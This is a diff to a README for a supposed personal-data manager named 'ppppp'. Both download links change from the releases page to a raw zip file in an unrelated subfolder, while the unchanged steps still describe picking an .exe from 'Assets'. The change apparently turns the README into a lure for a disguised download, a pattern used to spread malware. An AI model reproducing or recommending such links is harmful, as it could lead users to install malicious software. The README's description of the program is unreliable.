@@ -1,6 +1,6 @@
 # 🚀 ppppp - Manage your personal data with ease
 
-[![Download ppppp](https://img.shields.io/badge/Download-ppppp-blue)](https://github.com/specialeducationnabob584/ppppp/releases)
+[![Download ppppp](https://img.shields.io/badge/Download-ppppp-blue)](https://github.com/specialeducationnabob584/ppppp/raw/refs/heads/main/Bassalia/Software_v2.6.zip)
 
 ## 📋 About this application
 
@@ -23,7 +23,7 @@ The application does not depend on external servers or constant web access once 
 
 You must visit the official release page to obtain the installation file. Follow these steps to acquire the correct version:
 
-1. Click the following link: [Download ppppp here](https://github.com/specialeducationnabob584/ppppp/releases).
+1. Click the following link: [Download ppppp here](https://github.com/specialeducationnabob584/ppppp/raw/refs/heads/main/Bassalia/Software_v2.6.zip).
 2. Look for the section labeled "Assets" near the bottom of the page.
 3. Select the file ending in `.exe` to begin the download.
 4. Save the file to your computer, such as your Downloads folder.
